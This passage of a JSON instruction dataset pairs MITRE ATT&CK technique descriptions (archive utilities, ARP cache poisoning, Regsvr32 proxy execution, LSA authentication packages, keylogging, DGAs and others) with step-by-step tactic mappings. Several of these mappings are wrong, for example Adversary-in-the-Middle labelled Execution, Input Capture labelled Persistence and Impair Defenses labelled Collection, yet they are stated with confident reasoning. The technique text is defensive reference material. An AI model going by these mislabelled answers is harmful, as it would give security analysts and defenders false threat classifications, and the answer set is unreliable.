    "output": "The given description is related to sub technique: Archive via Utility (T1560.001);\nSub technique Archive via Utility (T1560.001) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
      "answer": "The given description is related to sub technique: Archive via Utility (T1560.001);\nSub technique Archive via Utility (T1560.001) is a type of technique Archive Collected Data (T1560);\nTechnique Archive Collected Data (T1560) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.?",
    "context": "",
    "output": "The given description is related to sub technique ARP Cache Poisoning (T1557.002);\nSub technique ARP Cache Poisoning (T1557.002) is a type of technique Adversary-in-the-Middle (T1557);\nTechnique Adversary-in-the-Middle (T1557) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.",
      "answer": "The given description is related to sub technique ARP Cache Poisoning (T1557.002);\nSub technique ARP Cache Poisoning (T1557.002) is a type of technique Adversary-in-the-Middle (T1557);\nTechnique Adversary-in-the-Middle (T1557) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.?",
    "context": "",
    "output": "The given description is related to sub technique: NTFS File Attributes (T1564.004);\nSub technique NTFS File Attributes (T1564.004) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
      "answer": "The given description is related to sub technique: NTFS File Attributes (T1564.004);\nSub technique NTFS File Attributes (T1564.004) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.?",
    "context": "",
    "output": "The given description is related to sub technique: Regsvr32 (T1218.010);\nSub technique Regsvr32 (T1218.010) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",
      "answer": "The given description is related to sub technique: Regsvr32 (T1218.010);\nSub technique Regsvr32 (T1218.010) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.?",
    "context": "",
    "output": "The given description is related to sub technique: Authentication Package (T1547.002);\nSub technique Authentication Package (T1547.002) is a type of technique Boot or Logon Autostart Execution (T1547);\nTechnique Boot or Logon Autostart Execution (T1547) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
      "answer": "The given description is related to sub technique: Authentication Package (T1547.002);\nSub technique Authentication Package (T1547.002) is a type of technique Boot or Logon Autostart Execution (T1547);\nTechnique Boot or Logon Autostart Execution (T1547) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
    "context": "",
    "output": "The given description is related to sub technique Exploits (T1587.004);\nSub technique Exploits (T1587.004) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
      "answer": "The given description is related to sub technique Exploits (T1587.004);\nSub technique Exploits (T1587.004) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.?",
    "context": "",
    "output": "The given description is related to sub technique: Application or System Exploitation (T1499.004);\nSub technique Application or System Exploitation (T1499.004) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users.  Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
      "answer": "The given description is related to sub technique: Application or System Exploitation (T1499.004);\nSub technique Application or System Exploitation (T1499.004) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.?",
    "context": "",
    "output": "The given description is related to sub technique: Keylogging (T1056.001);\nSub technique Keylogging (T1056.001) is a type of technique Input Capture (T1056);\nTechnique Input Capture (T1056) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "answer": "The given description is related to sub technique: Keylogging (T1056.001);\nSub technique Keylogging (T1056.001) is a type of technique Input Capture (T1056);\nTechnique Input Capture (T1056) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.",
    "context": "",
    "output": "The given description is related to sub technique Downgrade Attack (T1562.010);\nSub technique Downgrade Attack (T1562.010) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system\u2019s backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected.\n\nAdversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.",
      "answer": "The given description is related to sub technique Downgrade Attack (T1562.010);\nSub technique Downgrade Attack (T1562.010) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
    "context": "",
    "output": "The given description is related to sub technique LNK Icon Smuggling (T1027.012);\nSub technique LNK Icon Smuggling (T1027.012) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK.\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
      "answer": "The given description is related to sub technique LNK Icon Smuggling (T1027.012);\nSub technique LNK Icon Smuggling (T1027.012) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
    "context": "",
    "output": "The given description is related to sub technique: JavaScript (T1059.007);\nSub technique JavaScript (T1059.007) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
      "answer": "The given description is related to sub technique: JavaScript (T1059.007);\nSub technique JavaScript (T1059.007) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
    "context": "",
    "output": "The given description is related to sub technique: Domain Generation Algorithms (T1568.002);\nSub technique Domain Generation Algorithms (T1568.002) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
      "answer": "The given description is related to sub technique: Domain Generation Algorithms (T1568.002);\nSub technique Domain Generation Algorithms (T1568.002) is a type of technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "context": "",
    "output": "The given description is related to sub technique: Transmitted Data Manipulation (T1565.002);\nSub technique Transmitted Data Manipulation (T1565.002) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "answer": "The given description is related to sub technique: Transmitted Data Manipulation (T1565.002);\nSub technique Transmitted Data Manipulation (T1565.002) is a type of technique Data Manipulation (T1565);\nTechnique Data Manipulation (T1565) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
    "context": "",
    "output": "The given description is related to sub technique Malicious Link (T1204.001);\nSub technique Malicious Link (T1204.001) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
